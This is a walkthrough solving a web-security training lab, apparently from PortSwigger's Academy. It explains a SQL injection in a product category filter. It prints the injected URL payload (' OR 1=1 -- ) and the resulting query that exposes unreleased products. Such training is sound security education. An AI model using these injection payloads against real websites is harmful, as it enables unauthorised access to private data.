# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## Solution
Accessing the website, we can see a online shop with different products. If we click on some of the filters, we can see the URL containing the part of the WHERE clause: `https://0a13000c04c9d9238078305000e1003b.web-security-academy.net/filter?category=Corporate+gifts`

Since we know the exact query, we can manipulate it as followed: `https://0a13000c04c9d9238078305000e1003b.web-security-academy.net/filter?category=Corporate+gifts%27+or+1=1+--+`

This will create this SQL query:
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' OR 1=1 -- ' AND released = 1
```

With the apostrophe we are ending the string input for the category and with 'OR 1=1' we tell the database to list everything. A last we comment out the rest of the original query with the double dash.

With this injection we get all items from the store and the Lab is completed.
